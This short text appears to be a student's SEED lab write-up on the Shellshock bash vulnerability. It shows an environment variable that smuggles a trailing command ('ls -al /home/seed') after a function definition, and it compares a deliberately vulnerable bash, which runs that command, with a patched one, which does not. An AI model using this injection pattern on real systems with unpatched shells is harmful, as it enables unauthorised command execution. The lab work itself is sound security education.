I defined an environment variable 'foo' as such:
$ foo = "() { hello world; }; ls -al /home/seed"
$ export foo
$ /bin/bash_shellshock

I got a listing of my home directory immediately. Next I did:
$ <Ctrl-D>
$ /bin/bash

I received no directory listing this time. So the /bin/bash is not
vulnerable.
